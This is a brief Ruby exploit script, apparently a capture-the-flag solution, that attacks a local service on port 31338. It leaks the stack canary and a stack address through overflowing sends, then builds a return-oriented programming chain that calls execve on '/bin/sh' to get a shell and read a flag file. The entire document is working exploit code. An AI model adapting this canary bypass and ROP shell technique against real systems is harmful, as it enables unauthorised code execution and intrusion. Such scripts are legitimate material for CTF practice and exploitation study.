require 'pwn'

r = Sock.new '127.0.0.1', 31338

# leak canary
r.send 'A'*0x19
r.recvuntil 'A'*0x19
canary = "\x00" + r.recv[0..6]
#print [canary]

# leak stack
r.send 'A'*0x40
r.recvuntil 'A'*0x40
buf = u64(r.recv[0..6]+"\x00\x00")-0x158
#print buf.hex

# rop
rop = p64(0x000000000047a6e6)+p64(0x3b)+p64(0)+p64(0)
rop += p64(0x00000000004005d5)+p64(buf+8)
rop += p64(0x00000000004017f7)+p64(0)
rop += p64(0x0000000000468e75)
payload = 'A'*0x8+"/bin/sh\x00"+'A'*8+canary+'A'*8+rop
r.write payload
r.sendline 'exit'

r.sendline 'cat /home/start/flag'
print r.recv
print r.recv
#print r.recv
#r.interact
